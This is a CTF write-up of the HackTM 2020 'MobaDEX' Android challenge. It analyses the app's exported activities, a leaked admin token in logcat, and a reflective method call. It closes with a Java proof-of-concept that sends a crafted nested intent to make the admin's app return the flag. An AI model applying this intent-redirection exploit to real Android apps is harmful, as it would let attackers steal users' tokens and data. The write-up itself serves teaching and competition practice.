# MobaDEX

- CTF: **HackTM CTF Finals 2020**
- Difficulty: **Medium**
- Challenge Files: 
- Challenge Page: 

# Writeup

- Description: **It's december, HackTM CTF is rolling, what a time to make new friends. Hop on and join the latest and hottest Android Messaging Service: MobaDEX. MobaDEX allows you to make friends with other CTF players exchange Mobs in a very well-secured environment. It is prohibited to exchange flags.**

- Introduction: By simply running the application on a mobile device, we can get a very good overview of the application. It is an Android Messaging Application, based on a concept similar to Snapchat. The application allows the user to `Register an Account`, `Autenthicate`, `Add Friends`, `Write Moba` and `Read Moba` (the term `Moba` is being used to name the message that is being transferd from one account to another).

- Analysis: 
  * Now that we know what the application is about, let's take a look at how the application works. Looking at the `AndroidManifest.xml` file, we can see that there are multiple Activities declared: `.ProcessMoba`, `.SendMoba`, `.ui.main.ShowMoba`, `.LoginActivity`, `.RegisterActivity`, `.MainActivity`. Somthing that is particularly interesting is that only `RegisterActivity`, `LoginActivity`, and `SendMoba` activities are being exported. We will keep that in mind.
  * Looking at the `RegisterActivity`, we can see that it takes the input from the input fields (name / email / password) and passes it via a `POST` request to: `http://35.246.216.38:8686/api.php`. So the application is using an `API` server to handle the accounts and messages.
  * Now let's take a look at the `SendMoba` Acitvity, after all, the exported activities are some of the easiest entrypoint in the application. We can see that the application gets an `intent` and is expecting to contain `moba_user_token`, `moba_friend_token` and `moba_data` extras. The data is being send to `do_send_moba` which uses a custom serialization method to encode the `moba_data` intent and then alongside user's token and friend's token sends the data to the server. But what is a token? We can see that there is a class called `Session` which has the following structure:
  ```java
  public class Session {

      private String Flag = "HackTM{local_flag}";
      private String token;
      private static Session instance = null;

      protected Session() {
          this.token = "";
      }
      public String getToken(){
          return this.token;
      }
      public String getFlag(){ return this.Flag; }
      public void setToken(String token){
          this.token = token;
      }

      public static Session getInstance() {
          if(instance == null) {
              instance = new Session();
          }
          return instance;
      }
  }
  ```
  So the application holds user's token inside a singleton class called `Session`.
  * Let'stake a look at the `Add Friend` Activity. It looks pretty standard, takes an username and send it to the API server alongside user's token. However, something that later comes into our eyes is an if statement:
  ```java
  if(friend_username.equals("Admin_FeDEX")){
    updateTextView("Cannot add Admin!");
    Log.d("[MobaDEX]", myResponse);
  }
  ```
  So we can see that we are not allowed to add the user `Admin_FeDEX` as a friend. However, trying to add `Admin_FeDEX` as a friend and printing out the logs will display something interesting: 
  ```log
  2020-12-15 21:05:06.904 3012-3012/com.example.mobadex D/[MobaDEX]: 682314393318725
  ```
  This is the admin's token. So although we cannot the admin to our friends list, we are still able to send him a `Moba` by invoking the `SendMoba` activity and put the admin's token inside `moba_friend_token`.
  * We will keep that in mind, and analyze the last main component: `ReadMobaFragment`. It makes a call to the API and loads all the `Mobs` of the user with the token specified in the parameter. Then it sets an `onClick`listener where the `data` and the `id` of the `Moba` is being sent over to the `ProcessMoba` class. Inside the `ProcessMoba` we can see that data is being deserialized and the `moba_display_class` and `moba_display_package` and `moba_display_content` extras are being extracted. Then the information is being stored inside an intent as follows:
  ```java
  Intent intent = new Intent();
  intent.setClassName(moba_package, moba_class);
  intent.putExtra("display_content",moba_content);
  intent.putExtra("display_id",moba_id);
  ```
  This piece of code is very interesting because it sets the `ClassName` to a value that we can control by sending a custom `Moba`. We will keep that as well in mind. After that, there are some extra checks to see if some other extras are present inside the bundle. One thing that stands out is:
  ```java
  if(data.getString("moba_data") != null){
    String get_session_method = data.getString("moba_data");
    String extra_data = "";
    try {
        Method method = sess.getClass().getMethod(get_session_method);
        extra_data = (String)method.invoke(sess);
    } catch (SecurityException e) {
        Log.d("[MobaDEX]","Error:" + e);
        finish();
    }
  ...
  ```
  This piece of code allows us to get our own token if we supply the string `getToken` inside `moba_data`. But at the same time, if we put `getFlag` we are able to read `session.Flag`.
  
- Exploitation
  * With the final discovery, everything is clear. We need to start the `SendMoba` activity and make sure that the `Moba` is being sent to the Admin. Then, we would like instead of `ShowMoba` (which is the default class used when reading a Moba) to use `SendMoba` in order to be able to send the flag back to us. Then we will put the value "getFlag" inside `moba_data` and we're done.
  * Code
  ```java
  @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // EXPLOIT POC
        Intent i = new Intent();

        i.setComponent(new ComponentName("com.example.mobadex","com.example.mobadex.SendMoba"));

        Intent intent_data = new Intent();
        intent_data.putExtra("moba_display_content","PWNED by FeDEX"); // data that will be printed
        intent_data.putExtra("moba_display_package", "com.example.mobadex"); // PACKAGE
        //  intent_data.putExtra("moba_display_class","com.example.mobadex.ui.main.ShowMoba"); // CLASS
        intent_data.putExtra("moba_display_class","com.example.mobadex.SendMoba"); // CLASS
        intent_data.putExtra("moba_user_token","682314393318725"); // VICTIM (send back from admin to me)
        intent_data.putExtra("moba_friend_token","538622981120038"); // ATTACKER
        intent_data.putExtra("moba_data","getFlag"); // function to trigger

        i.putExtra("moba_user_token","538622981120038"); // ATTACKER (send malicious payload from me to admin)
        i.putExtra("moba_friend_token","682314393318725"); // VICTIM
        i.putExtra("moba_data",intent_data);

        startActivity(i);
    }
  ```
